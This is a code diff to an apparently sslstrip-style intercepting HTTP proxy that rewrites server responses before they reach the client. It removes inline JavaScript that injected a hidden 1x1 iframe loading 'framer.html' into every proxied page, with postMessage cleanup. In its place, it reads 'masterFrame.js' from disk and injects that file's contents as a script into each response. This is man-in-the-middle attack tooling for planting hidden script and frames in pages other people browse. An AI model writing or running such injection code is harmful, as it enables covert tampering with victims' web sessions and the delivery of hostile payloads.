@@ -70,7 +70,7 @@ class ServerConnection(HTTPClient):
                 logging.debug("not scanning...")
                 
         elif (key.lower() == 'content-encoding'):
-            if (value.find('gzip') != -1):
+            if "gzip" in value:
                 logging.debug("Response is compressed...")
                 self.isCompressed = True
                 
@@ -95,6 +95,7 @@ class ServerConnection(HTTPClient):
             self.client.write(data)
         else:
             HTTPClient.handleResponsePart(self, data)
+
 
     def handleResponseEnd(self):
         
@@ -121,38 +122,9 @@ class ServerConnection(HTTPClient):
              rest = data[headEnd:] 
                                                                             
                                                                                                                
-
-         createMasterFrame = "function createMasterFrame()                                                       \
-                              {                                                                                  \
-                                masterFrame = document.createElement(\"IFRAME\");                                \
-                                masterFrame.setAttribute(\"src\", \"framer.html\");                              \
-                                masterFrame.setAttribute(\"id\", \"masterFrame\");                               \
-                                masterFrame.setAttribute(\"name\", \"masterFrame\");                             \
-                                masterFrame.setAttribute(\"height\", \"1\");                                   \
-                                masterFrame.setAttribute(\"width\", \"1\");                                    \
-                                document.body.appendChild(masterFrame);                                          \
-                              }"
-
-         destroyMasterFrame = "function destroyMasterFrame() \
-                               {  \
-                                  var master = document.getElementById(\"masterFrame\"); \
-                                  master.parentNode.removeChild(master); \
-                               };"
-
-         initFraming =         "function initFraming() \
-                                { \
-                                   if (window.addEventListener){ \
-                                      window.addEventListener(\"message\", destroyMasterFrame, false); \
-                                   }else{ \
-                                      if(window.attachEvent){ \
-                                         window.attachEvent(\"onmessage\", destroyMasterFrame); \
-                                      } \
-                                   } \
-                                   createMasterFrame(); \
-                                }"
-
-         js = "<script type=\"text/javascript\">"+destroyMasterFrame+createMasterFrame+initFraming+"setTimeout(\"initFraming()\",300);</script>"  
-         newData += js + rest
+         masterFrame = open("masterFrame.js")
+         newData += "<script type=\"text/javascript\">"+ masterFrame.read() +"</script>" + rest
+         masterFrame.close()
          return newData
          
 
